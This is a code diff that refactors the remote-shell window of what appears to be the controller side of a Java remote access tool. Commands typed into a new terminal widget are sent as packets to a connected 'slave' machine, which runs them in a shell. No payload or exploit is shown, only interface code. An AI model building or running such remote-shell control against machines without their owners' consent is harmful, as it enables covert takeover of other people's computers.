@@ -1,38 +1,35 @@
 package se.jrat.client.ui.frames;
 
-import java.awt.Color;
+import java.awt.BorderLayout;
 import java.awt.Toolkit;
-import java.awt.event.KeyAdapter;
-import java.awt.event.KeyEvent;
+import java.awt.event.AdjustmentEvent;
+import java.awt.event.AdjustmentListener;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
+import java.util.Map;
 
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
 import javax.swing.JFrame;
-import javax.swing.JPanel;
+import javax.swing.JScrollBar;
 import javax.swing.JScrollPane;
-import javax.swing.JTextField;
-import javax.swing.JTextPane;
-import javax.swing.ScrollPaneConstants;
-import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet23RemoteShellStart;
 import se.jrat.client.packets.outgoing.Packet24RemoteShellStop;
 import se.jrat.client.packets.outgoing.Packet25RemoteShellExecute;
 
+import com.redpois0n.terminal.InputListener;
+import com.redpois0n.terminal.JTerminal;
+import com.redpois0n.terminal.SizeChangeListener;
 
 @SuppressWarnings("serial")
 public class FrameRemoteShell extends BaseFrame {
 
-	private JPanel contentPane;
-
-	public static HashMap<Slave, FrameRemoteShell> instances = new HashMap<Slave, FrameRemoteShell>();
-	public Slave slave;
-	private JTextField txtCommand;
-	public JTextPane textPane;
+	public static final Map<Slave, FrameRemoteShell> instances = new HashMap<Slave, FrameRemoteShell>();
+	
+	private Slave slave;
+	private JTerminal terminal;
+	private JScrollPane scrollPane;
 
 	public FrameRemoteShell(Slave slave) {
 		super();
@@ -47,39 +44,65 @@ public class FrameRemoteShell extends BaseFrame {
 		});
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/icons/cmd.png")));
 		setTitle("Remote Shell - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
-		final Slave sl = slave;
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 499, 302);
-		contentPane = new JPanel();
-		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
-		setContentPane(contentPane);
-		txtCommand = new JTextField();
-		txtCommand.addKeyListener(new KeyAdapter() {
+
+		scrollPane = new JScrollPane();
+		terminal = new JTerminal();
+		scrollPane.setViewportView(terminal);
+		
+		scrollPane.getVerticalScrollBar().addAdjustmentListener(new AdjustmentListener() {  
+		    public void adjustmentValueChanged(AdjustmentEvent e) {  
+		    	if (terminal.scrollToBottom()) {
+		    		boolean scrollUp = terminal.scrollUp();
+		    		e.getAdjustable().setValue(scrollUp ? 0 : e.getAdjustable().getMaximum());  
+		    	} 
+		    }
+		});
+		
+		terminal.addInputListener(new InputListener() {
 			@Override
-			public void keyPressed(KeyEvent e) {
-				if (e.getKeyCode() == KeyEvent.VK_ENTER && txtCommand.getText().trim().length() > 0) {
-					String command = txtCommand.getText().trim();
-					sl.addToSendQueue(new Packet25RemoteShellExecute(command));
-					txtCommand.setText("");
+			public void processCommand(JTerminal terminal, String command) {
+				if (command.equalsIgnoreCase("clear") || command.equalsIgnoreCase("cls")) {
+					terminal.clear();
+					return;
 				}
+				System.out.println(command);
+				send(command + "\n");
+				terminal.setBlockAtCurrentPos();
+			}
+			
+			@Override
+			public void onTerminate(JTerminal terminal) {
+			
 			}
 		});
-		txtCommand.setColumns(10);
+		
+		terminal.addSizeChangeListener(new SizeChangeListener() {
+			@Override
+			public void sizeChange(JTerminal terminal, int width, int height) {
+				JScrollBar vertical = scrollPane.getVerticalScrollBar();
+				scrollPane.revalidate();
+				vertical.revalidate();
+				vertical.setValue(vertical.getMaximum());
+				terminal.revalidate();
+			}
+		});
+		
+		getContentPane().add(scrollPane, BorderLayout.CENTER);
 
-		JScrollPane scrollPane = new JScrollPane();
-		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
-
-		textPane = new JTextPane();
-		scrollPane.setViewportView(textPane);
-		textPane.setEditable(false);
-		textPane.setForeground(Color.WHITE);
-		textPane.setBackground(Color.BLACK);
-		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE).addComponent(txtCommand, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE));
-		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 245, GroupLayout.PREFERRED_SIZE).addGap(1).addComponent(txtCommand, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)));
-		contentPane.setLayout(gl_contentPane);
-
+		addKeyListener(terminal.getKeyListener());
+		setSize(675, 300);
+		
 		slave.addToSendQueue(new Packet23RemoteShellStart());
+	}
+	
+	private void send(String command) {
+        slave.addToSendQueue(new Packet25RemoteShellExecute(command));
+	}
+	
+	public JTerminal getTerminal() {
+		return terminal;
 	}
 
 	public void exit() {
